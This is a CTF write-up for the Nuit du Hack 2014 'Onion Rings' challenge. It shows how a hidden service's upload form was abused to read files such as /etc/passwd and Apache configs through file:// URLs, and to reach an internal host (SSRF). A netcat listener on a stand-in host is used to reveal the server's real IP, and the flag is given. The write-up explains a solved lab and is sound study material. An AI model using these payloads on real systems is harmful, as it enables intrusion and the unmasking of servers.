# Nuit du Hack CTF Qualifications: Onion Rings

**Category:** Miscellaneous
**Points:** 150
**Description:**

> A new black market has appeared and has been targeted by the FBI. After checking for suspicious posts on stackoverflow and finding nothing, they give up and are offering a bounty to anyone who can get information on the server that is hosting the hidden service.
>
> http://mq72g4732yorslzf.onion/

## Write-up

`.onion` URLs can only be visited through the Tor network. After firing up Tor and browsing around for a bit, <http://mq72g4732yorslzf.onion/upload.php> seems vulnerable to file disclosure. Entering `file:///etc/passwd` in the URL field results in the following HTML after submitting the form:

```html
…
<img src="data:image/gif;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovYmluL3NoCmJpbjp4OjI6MjpiaW46L2JpbjovYmluL3NoCnN5czp4OjM6MzpzeXM6L2RldjovYmluL3NoCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L2Jpbi9zaAptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovYmluL3NoCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi9iaW4vc2gKbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovYmluL3NoCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L2Jpbi9zaAp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L2Jpbi9zaApwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L2Jpbi9zaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi9iaW4vc2gKYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovYmluL3NoCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L2Jpbi9zaAppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L2Jpbi9zaApnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L2Jpbi9zaApub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi9iaW4vc2gKbGlidXVpZDp4OjEwMDoxMDE6Oi92YXIvbGliL2xpYnV1aWQ6L2Jpbi9zaApEZWJpYW4tZXhpbTp4OjEwMToxMDM6Oi92YXIvc3Bvb2wvZXhpbTQ6L2Jpbi9mYWxzZQpzdGF0ZDp4OjEwMjo2NTUzNDo6L3Zhci9saWIvbmZzOi9iaW4vZmFsc2UKc3NoZDp4OjEwMzo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpudHA6eDoxMDQ6MTA2OjovaG9tZS9udHA6L2Jpbi9mYWxzZQpkZWJpYW4tdG9yOng6MTA1OjEwODo6L3Zhci9saWIvdG9yOi9iaW4vZmFsc2UKbXlzcWw6eDoxMDY6MTA5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=">
…
```

Base64-decoding that reveals the contents of the file, in this case `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ntp:x:104:106::/home/ntp:/bin/false
debian-tor:x:105:108::/var/lib/tor:/bin/false
mysql:x:106:109:MySQL Server,,,:/nonexistent:/bin/false
```

Entering a non-existent file or directory path results in the following:

```html
<img src="data:image/gif;base64,">
```

Entering a valid directory path or the path to a file larger than 2.7 KB results in:

```html
The maximum image size is 2.7kb, yunno, for the cookies.
```

Let’s try entering `file:///etc/hosts` to see what `/etc/hosts` looks like:

```
127.0.0.1 localhost.localdomain localhost
192.168.99.22 quals.hackerzvoice.net quals
212.83.153.197 quals.hackerzvoice.net quals

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Visiting <http://quals.hackerzvoice.net/> in a regular browser doesn’t reveal anything interesting, but this configuration shows that when the server running the Onion Rings website accesses that hostname, it will resolve to a local IP address in the same network. So let’s see what the main page says by entering `http://quals.hackerzvoice.net/` in the URL field. The [resulting HTML page can be viewed here](blog.html). It contains the following:

> He started screaming at me saying weird shit I didn’t understand, then he just lookde blank and mumbled: “The flag .. The flag.. It is ’0hSh1t1r4n0ut0fn00dl35′. And then he just died in front of me. Weird..

The flag is `0hSh1t1r4n0ut0fn00dl35`.

## Additional information

At first I thought the flag would be hidden in the source code of the Onion Rings website itself. The `/etc/passwd` file (see above) hints that Apache is used, but the `/var/www/html/` directory (the default on most installations) didn’t seem to exist.

To figure out the correct path, let’s look at `/etc/apache2/ports.conf`:

```
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default
# This is also true if you have upgraded from before 2.2.9-3 (i.e. from
# Debian etch). See /usr/share/doc/apache2.2-common/NEWS.Debian.gz and
# README.Debian.gz

NameVirtualHost *:80
Listen 80
Listen 8056

<IfModule mod_ssl.c>
    # If you add NameVirtualHost *:443 here, you will also have to change
    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
    # to <VirtualHost *:443>
    # Server Name Indication for SSL named virtual hosts is currently not
    # supported by MSIE on Windows XP.
    Listen 443
</IfModule>

<IfModule mod_gnutls.c>
    Listen 443
</IfModule>
```

The header comment points to `/etc/apache2/sites-enabled/000-default`. Let’s see what’s in there:

```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost

    DocumentRoot /var/www/blog
    <Directory />
        Options FollowSymLinks
        AllowOverride None
    </Directory>
    <Directory /var/www/blog/>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride None
        Order allow,deny
        allow from all
    </Directory>

    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
        AllowOverride None
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
        Order allow,deny
        Allow from all
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log

    # Possible values include: debug, info, notice, warn, error, crit,
    # alert, emerg.
    LogLevel warn

    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:8056>
    ServerName mq72g4732yorslzf.onion
    DocumentRoot /var/www/onion_rings
</VirtualHost>
```

This reveals that the server hosts a blog (the one we found the flag on) from the `/var/www/blog/` directory, and the Onion Rings website from `/var/www/onion_rings`.

Looking at `/var/www/blog/index.php` it’s obvious that the blog is powered by WordPress. I tried looking at `/var/www/blog/wp-config.php` and `/var/www/wp-config.php` but those files didn’t exist.

Most of the files in `/var/www/onion_rings` could be retrieved; others couldn’t because they were too large. [They’re in the `source` folder](source) if you’re curious, but note that these files were not helpful at all for getting the flag.

## Alternate approach

Another approach would be to enter a URL on a server under your control.

Start [Netcat](http://netcat.sourceforge.net/) or [Ncat](http://nmap.org/ncat) on your host to listen on port 80 (attention: your host should _not_ be behind NAT):

```bash
$ nc -vlp 80 # or use `netcat`
```

Then, on the Onion Rings website, enter the URL e.g. `http://your-host.example.com/1.jpg` and look for the IP of the Onion Rings server.

```
Ncat: Version 6.25 ( http://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 212.83.153.197.
Ncat: Connection from 212.83.153.197:54869.
GET /1.jpg HTTP/1.1
Host: your-host.example.com
Accept: */*
```

The IP address is clearly `212.83.153.197`. Visiting `http://212.83.153.197/` shows [the blog we’ve discussed before](blog.html), which contains the flag.

## Other write-ups and resources

* <http://csrc.tamuc.edu/css/?p=116>
* <http://sigint.ru/writeups/2014/04/07/nuit-du-hack-2014-writeups/#onion-rings>
* <http://tasteless.eu/2014/04/nuit-du-hack-ctf-quals-2014-misc150-and-misc200-writeup/>
* <http://lockboxx.blogspot.de/2014/04/nuit-du-hack-2014-quals-ctf-writeup.html>
